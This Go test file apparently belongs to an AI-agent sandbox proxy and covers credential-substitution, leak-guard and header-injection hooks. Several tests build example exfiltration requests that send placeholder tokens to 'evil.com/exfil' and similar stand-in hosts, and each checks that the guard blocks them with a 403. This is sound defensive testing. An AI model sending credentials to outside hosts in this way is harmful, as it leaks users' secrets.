package proxy

import (
	"bytes"
	"errors"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/agentsh/agentsh/internal/proxy/credsub"
)

func newTestTable(t *testing.T) *credsub.Table {
	t.Helper()
	tbl := credsub.New()
	// 24-char fakes/reals (minimum entropy length)
	if err := tbl.Add("github",
		[]byte("ghp_FAKE1234567890abcdef"),
		[]byte("ghp_REAL1234567890abcdef"),
	); err != nil {
		t.Fatal(err)
	}
	return tbl
}

func TestCredsSubHook_Name(t *testing.T) {
	h := NewCredsSubHook(credsub.New())
	if h.Name() != "creds-sub" {
		t.Errorf("Name() = %q, want %q", h.Name(), "creds-sub")
	}
}

func TestCredsSubHook_PreHook_ReplacesFakeToReal(t *testing.T) {
	tbl := newTestTable(t)
	h := NewCredsSubHook(tbl)

	body := []byte(`{"token":"ghp_FAKE1234567890abcdef"}`)
	req := httptest.NewRequest(http.MethodPost, "http://api.example.com/v1/test", bytes.NewReader(body))
	req.ContentLength = int64(len(body))

	err := h.PreHook(req, &RequestContext{})
	if err != nil {
		t.Fatalf("PreHook returned error: %v", err)
	}

	got, _ := io.ReadAll(req.Body)
	want := []byte(`{"token":"ghp_REAL1234567890abcdef"}`)
	if !bytes.Equal(got, want) {
		t.Errorf("body after PreHook:\n  got:  %s\n  want: %s", got, want)
	}
	if req.ContentLength != int64(len(want)) {
		t.Errorf("ContentLength = %d, want %d", req.ContentLength, len(want))
	}
}

func TestCredsSubHook_PostHook_ReplacesRealToFake(t *testing.T) {
	tbl := newTestTable(t)
	h := NewCredsSubHook(tbl)

	body := []byte(`{"echoed":"ghp_REAL1234567890abcdef"}`)
	resp := &http.Response{
		StatusCode:    200,
		Body:          io.NopCloser(bytes.NewReader(body)),
		ContentLength: int64(len(body)),
	}

	err := h.PostHook(resp, &RequestContext{})
	if err != nil {
		t.Fatalf("PostHook returned error: %v", err)
	}

	got, _ := io.ReadAll(resp.Body)
	want := []byte(`{"echoed":"ghp_FAKE1234567890abcdef"}`)
	if !bytes.Equal(got, want) {
		t.Errorf("body after PostHook:\n  got:  %s\n  want: %s", got, want)
	}
	if resp.ContentLength != int64(len(want)) {
		t.Errorf("ContentLength = %d, want %d", resp.ContentLength, len(want))
	}
}

func TestCredsSubHook_PreHook_NoFakes_BodyUnchanged(t *testing.T) {
	tbl := newTestTable(t)
	h := NewCredsSubHook(tbl)

	body := []byte(`{"query":"hello world"}`)
	req := httptest.NewRequest(http.MethodPost, "http://api.example.com/v1/test", bytes.NewReader(body))

	err := h.PreHook(req, &RequestContext{})
	if err != nil {
		t.Fatalf("PreHook returned error: %v", err)
	}

	got, _ := io.ReadAll(req.Body)
	if !bytes.Equal(got, body) {
		t.Errorf("body should be unchanged, got: %s", got)
	}
}

func TestCredsSubHook_NilBody(t *testing.T) {
	tbl := newTestTable(t)
	h := NewCredsSubHook(tbl)

	req := httptest.NewRequest(http.MethodGet, "http://api.example.com/", nil)
	if err := h.PreHook(req, &RequestContext{}); err != nil {
		t.Fatalf("PreHook with nil body returned error: %v", err)
	}

	resp := &http.Response{StatusCode: 200, Body: nil}
	if err := h.PostHook(resp, &RequestContext{}); err != nil {
		t.Fatalf("PostHook with nil body returned error: %v", err)
	}
}

func TestLeakGuardHook_Name(t *testing.T) {
	h := NewLeakGuardHook(credsub.New(), slog.Default())
	if h.Name() != "leak-guard" {
		t.Errorf("Name() = %q, want %q", h.Name(), "leak-guard")
	}
}

func TestLeakGuardHook_FakeInBody_Returns403(t *testing.T) {
	tbl := newTestTable(t)
	h := NewLeakGuardHook(tbl, slog.Default())

	body := []byte(`{"token":"ghp_FAKE1234567890abcdef"}`)
	req := httptest.NewRequest(http.MethodPost, "http://evil.com/exfil", bytes.NewReader(body))

	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
	if err == nil {
		t.Fatal("expected error from LeakGuardHook")
	}

	var abortErr *HookAbortError
	if !errors.As(err, &abortErr) {
		t.Fatalf("expected HookAbortError, got: %T", err)
	}
	if abortErr.StatusCode != 403 {
		t.Errorf("StatusCode = %d, want 403", abortErr.StatusCode)
	}
}

func TestLeakGuardHook_FakeInQuery_Returns403(t *testing.T) {
	tbl := newTestTable(t)
	h := NewLeakGuardHook(tbl, slog.Default())

	req := httptest.NewRequest(http.MethodGet, "http://evil.com/api?key=ghp_FAKE1234567890abcdef", nil)

	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
	if err == nil {
		t.Fatal("expected error from LeakGuardHook")
	}

	var abortErr *HookAbortError
	if !errors.As(err, &abortErr) {
		t.Fatalf("expected HookAbortError, got: %T", err)
	}
	if abortErr.StatusCode != 403 {
		t.Errorf("StatusCode = %d, want 403", abortErr.StatusCode)
	}
}

func TestLeakGuardHook_FakeInAuthHeader_Returns403(t *testing.T) {
	tbl := newTestTable(t)
	h := NewLeakGuardHook(tbl, slog.Default())

	req := httptest.NewRequest(http.MethodPost, "http://evil.com/api", nil)
	req.Header.Set("Authorization", "Bearer ghp_FAKE1234567890abcdef")

	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
	if err == nil {
		t.Fatal("expected error from LeakGuardHook")
	}

	var abortErr *HookAbortError
	if !errors.As(err, &abortErr) {
		t.Fatalf("expected HookAbortError, got: %T", err)
	}
}

func TestLeakGuardHook_FakeInXApiKeyHeader_Returns403(t *testing.T) {
	tbl := newTestTable(t)
	h := NewLeakGuardHook(tbl, slog.Default())

	req := httptest.NewRequest(http.MethodPost, "http://evil.com/api", nil)
	req.Header.Set("X-Api-Key", "ghp_FAKE1234567890abcdef")

	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
	if err == nil {
		t.Fatal("expected error from LeakGuardHook")
	}

	var abortErr *HookAbortError
	if !errors.As(err, &abortErr) {
		t.Fatalf("expected HookAbortError, got: %T", err)
	}
}

func TestLeakGuardHook_NoFakes_Passes(t *testing.T) {
	tbl := newTestTable(t)
	h := NewLeakGuardHook(tbl, slog.Default())

	body := []byte(`{"message":"hello world, no secrets here"}`)
	req := httptest.NewRequest(http.MethodPost, "http://api.github.com/v1/repos", bytes.NewReader(body))

	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
	if err != nil {
		t.Fatalf("LeakGuardHook should pass clean requests, got: %v", err)
	}

	// Body should still be readable after check.
	got, _ := io.ReadAll(req.Body)
	if !bytes.Equal(got, body) {
		t.Errorf("body was corrupted after LeakGuardHook")
	}
}

func TestLeakGuardHook_EmptyTable_Passes(t *testing.T) {
	tbl := credsub.New()
	h := NewLeakGuardHook(tbl, slog.Default())

	body := []byte(`{"token":"ghp_FAKE1234567890abcdef"}`)
	req := httptest.NewRequest(http.MethodPost, "http://evil.com/exfil", bytes.NewReader(body))

	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
	if err != nil {
		t.Fatalf("empty table should pass all requests, got: %v", err)
	}
}

func TestLeakGuardHook_PostHook_IsNoOp(t *testing.T) {
	tbl := newTestTable(t)
	h := NewLeakGuardHook(tbl, slog.Default())

	resp := &http.Response{StatusCode: 200, Body: nil}
	err := h.PostHook(resp, &RequestContext{})
	if err != nil {
		t.Fatalf("PostHook should be no-op, got: %v", err)
	}
}

func TestLeakGuardHook_DuplicateHeaders_Returns403(t *testing.T) {
	tbl := newTestTable(t)
	h := NewLeakGuardHook(tbl, slog.Default())

	req := httptest.NewRequest(http.MethodPost, "http://evil.com/api", nil)
	// First header value is clean, second contains the fake.
	req.Header.Set("Authorization", "Bearer clean-token-here!!!!!")
	req.Header.Add("Authorization", "Bearer ghp_FAKE1234567890abcdef")

	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
	if err == nil {
		t.Fatal("expected error — fake is in second Authorization header value")
	}

	var abortErr *HookAbortError
	if !errors.As(err, &abortErr) {
		t.Fatalf("expected HookAbortError, got: %T", err)
	}
	if abortErr.StatusCode != 403 {
		t.Errorf("StatusCode = %d, want 403", abortErr.StatusCode)
	}
}

func TestHeaderInjectionHook_Name(t *testing.T) {
	tbl := credsub.New()
	h := NewHeaderInjectionHook("github", "Authorization", "Bearer {{secret}}", tbl)
	if h.Name() != "header-inject" {
		t.Errorf("Name() = %q, want %q", h.Name(), "header-inject")
	}
}

func TestHeaderInjectionHook_PreHook_InjectsHeader(t *testing.T) {
	tbl := newTestTable(t) // has "github" → fake/real pair
	h := NewHeaderInjectionHook("github", "Authorization", "Bearer {{secret}}", tbl)

	req := httptest.NewRequest(http.MethodPost, "http://api.github.com/repos", nil)
	req.Header.Set("Authorization", "Bearer ghp_FAKE1234567890abcdef")

	err := h.PreHook(req, &RequestContext{ServiceName: "github"})
	if err != nil {
		t.Fatalf("PreHook error: %v", err)
	}

	got := req.Header.Get("Authorization")
	want := "Bearer ghp_REAL1234567890abcdef"
	if got != want {
		t.Errorf("Authorization = %q, want %q", got, want)
	}
}

func TestHeaderInjectionHook_PreHook_StripsExistingHeader(t *testing.T) {
	tbl := newTestTable(t)
	h := NewHeaderInjectionHook("github", "Authorization", "Bearer {{secret}}", tbl)

	req := httptest.NewRequest(http.MethodPost, "http://api.github.com/repos", nil)
	req.Header.Set("Authorization", "Bearer something-wrong")
	req.Header.Add("Authorization", "Bearer also-wrong")

	err := h.PreHook(req, &RequestContext{ServiceName: "github"})
	if err != nil {
		t.Fatalf("PreHook error: %v", err)
	}

	// Should have exactly one Authorization header.
	vals := req.Header.Values("Authorization")
	if len(vals) != 1 {
		t.Errorf("expected 1 Authorization value, got %d", len(vals))
	}
}

func TestHeaderInjectionHook_PreHook_ServiceNotInTable(t *testing.T) {
	tbl := credsub.New()
	h := NewHeaderInjectionHook("nonexistent", "Authorization", "Bearer {{secret}}", tbl)

	req := httptest.NewRequest(http.MethodPost, "http://example.com", nil)

	err := h.PreHook(req, &RequestContext{})
	if err != nil {
		t.Fatalf("PreHook should be no-op when service not in table: %v", err)
	}

	if req.Header.Get("Authorization") != "" {
		t.Error("header should not be set when service is not in table")
	}
}

func TestHeaderInjectionHook_PostHook_IsNoOp(t *testing.T) {
	tbl := newTestTable(t)
	h := NewHeaderInjectionHook("github", "Authorization", "Bearer {{secret}}", tbl)

	resp := &http.Response{StatusCode: 200, Body: nil}
	err := h.PostHook(resp, &RequestContext{})
	if err != nil {
		t.Fatalf("PostHook should be no-op: %v", err)
	}
}

func TestCredsSubHook_PreHook_ReplacesInHeaders(t *testing.T) {
	tbl := newTestTable(t)
	h := NewCredsSubHook(tbl)

	req := httptest.NewRequest(http.MethodPost, "http://api.example.com/v1/test", nil)
	req.Header.Set("Authorization", "Bearer ghp_FAKE1234567890abcdef")

	err := h.PreHook(req, &RequestContext{})
	if err != nil {
		t.Fatalf("PreHook error: %v", err)
	}

	got := req.Header.Get("Authorization")
	want := "Bearer ghp_REAL1234567890abcdef"
	if got != want {
		t.Errorf("Authorization = %q, want %q", got, want)
	}
}

func TestCredsSubHook_PreHook_ReplacesInQuery(t *testing.T) {
	tbl := newTestTable(t)
	h := NewCredsSubHook(tbl)

	req := httptest.NewRequest(http.MethodGet,
		"http://api.example.com/v1/test?key=ghp_FAKE1234567890abcdef", nil)

	err := h.PreHook(req, &RequestContext{})
	if err != nil {
		t.Fatalf("PreHook error: %v", err)
	}

	got := req.URL.RawQuery
	want := "key=ghp_REAL1234567890abcdef"
	if got != want {
		t.Errorf("RawQuery = %q, want %q", got, want)
	}
}

func TestCredsSubHook_PreHook_ReplacesInPath(t *testing.T) {
	tbl := newTestTable(t)
	h := NewCredsSubHook(tbl)

	req := httptest.NewRequest(http.MethodGet,
		"http://api.example.com/v1/ghp_FAKE1234567890abcdef/info", nil)

	err := h.PreHook(req, &RequestContext{})
	if err != nil {
		t.Fatalf("PreHook error: %v", err)
	}

	got := req.URL.Path
	want := "/v1/ghp_REAL1234567890abcdef/info"
	if got != want {
		t.Errorf("Path = %q, want %q", got, want)
	}
}

func TestLeakGuardHook_SkipsMatchedService(t *testing.T) {
	tbl := newTestTable(t) // has "github" fake
	h := NewLeakGuardHook(tbl, slog.Default())

	body := []byte(`{"token":"ghp_FAKE1234567890abcdef"}`)
	req := httptest.NewRequest(http.MethodPost, "http://api.github.com/repos", bytes.NewReader(body))

	// ServiceName is set — this is a matched service, should NOT block.
	err := h.PreHook(req, &RequestContext{
		RequestID:   "r1",
		SessionID:   "s1",
		ServiceName: "github",
	})
	if err != nil {
		t.Fatalf("LeakGuardHook should skip matched services, got: %v", err)
	}
}

func TestLeakGuardHook_BlocksUnmatchedWithFake(t *testing.T) {
	tbl := newTestTable(t)
	h := NewLeakGuardHook(tbl, slog.Default())

	body := []byte(`{"token":"ghp_FAKE1234567890abcdef"}`)
	req := httptest.NewRequest(http.MethodPost, "http://evil.com/exfil", bytes.NewReader(body))

	// ServiceName is empty — unmatched host, should block.
	err := h.PreHook(req, &RequestContext{
		RequestID:   "r1",
		SessionID:   "s1",
		ServiceName: "",
	})
	if err == nil {
		t.Fatal("LeakGuardHook should block fakes to unmatched hosts")
	}

	var abortErr *HookAbortError
	if !errors.As(err, &abortErr) || abortErr.StatusCode != 403 {
		t.Errorf("expected HookAbortError 403, got: %v", err)
	}
}

func TestLeakGuardHook_FakeInCustomHeader_Returns403(t *testing.T) {
	tbl := newTestTable(t)
	h := NewLeakGuardHook(tbl, slog.Default())

	req := httptest.NewRequest(http.MethodPost, "http://evil.com/api", nil)
	req.Header.Set("X-Custom-Token", "ghp_FAKE1234567890abcdef")

	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
	if err == nil {
		t.Fatal("expected error — fake is in custom header")
	}

	var abortErr *HookAbortError
	if !errors.As(err, &abortErr) || abortErr.StatusCode != 403 {
		t.Errorf("expected HookAbortError 403, got: %v", err)
	}
}

func TestLeakGuardHook_FakeInPath_Returns403(t *testing.T) {
	tbl := newTestTable(t)
	h := NewLeakGuardHook(tbl, slog.Default())

	req := httptest.NewRequest(http.MethodGet, "http://evil.com/api/ghp_FAKE1234567890abcdef/data", nil)

	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
	if err == nil {
		t.Fatal("expected error — fake is in URL path")
	}

	var abortErr *HookAbortError
	if !errors.As(err, &abortErr) || abortErr.StatusCode != 403 {
		t.Errorf("expected HookAbortError 403, got: %v", err)
	}
}

func TestLeakGuardHook_BlocksCrossServiceFake(t *testing.T) {
	tbl := credsub.New()
	// Two services with different fakes.
	if err := tbl.Add("github",
		[]byte("ghp_FAKE1234567890abcdef"),
		[]byte("ghp_REAL1234567890abcdef"),
	); err != nil {
		t.Fatal(err)
	}
	if err := tbl.Add("anthropic",
		[]byte("sk-ant-FAKE567890abcdef12"),
		[]byte("sk-ant-REAL567890abcdef12"),
	); err != nil {
		t.Fatal(err)
	}
	h := NewLeakGuardHook(tbl, slog.Default())

	// Request matched to "github" but carrying anthropic's fake -> should block.
	body := []byte(`{"token":"sk-ant-FAKE567890abcdef12"}`)
	req := httptest.NewRequest(http.MethodPost, "http://api.github.com/repos", bytes.NewReader(body))

	err := h.PreHook(req, &RequestContext{
		RequestID:   "r1",
		SessionID:   "s1",
		ServiceName: "github",
	})
	if err == nil {
		t.Fatal("expected error — anthropic fake in github-matched request should be blocked")
	}

	var abortErr *HookAbortError
	if !errors.As(err, &abortErr) || abortErr.StatusCode != 403 {
		t.Errorf("expected HookAbortError 403, got: %v", err)
	}
}
